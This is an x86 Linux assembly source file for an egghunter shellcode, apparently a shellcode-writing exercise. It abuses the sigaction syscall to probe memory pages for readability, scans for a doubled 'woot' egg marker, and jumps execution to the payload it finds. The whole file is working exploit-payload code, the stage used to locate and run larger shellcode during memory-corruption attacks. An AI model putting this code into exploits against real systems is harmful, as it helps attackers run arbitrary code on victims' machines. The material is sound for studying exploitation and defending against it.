; #define __NR_sigaction 67 (syscall number)
; int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact);

global _start

section .text

_start:
    	
align_page:  
    	or cx,0xfff         	; setup page alignment

next_address:  
    	inc ecx             	; Increment our page alignment 
    	push byte +0x43     	; push sigaction call nuumber - 67
    	pop eax             	; set eax to 67
    	int 0x80            	; perform syscall
    	cmp al,0xf2         	; check if EFAULT was received
    	jz align_page       	; if it did, continue to next pointer 
    	mov eax, 0x776f6f74 	; storing egg key (woot - make sure in C key you are looking for reversed bytes - \x77\x6f\x6f\x74)
    	mov edi, ecx        	; the address to compare
    	scasd               	; compare eax with edi and increment edi by 4
    	jnz next_address    	; if not matched try next address
    	scasd               	; it it did check next bytes in order to make sure we are not in the hunter code itself
    	jnz next_address    	; if next 4 were not matched try next address
    	jmp edi             	; we found the key, jump execution to it
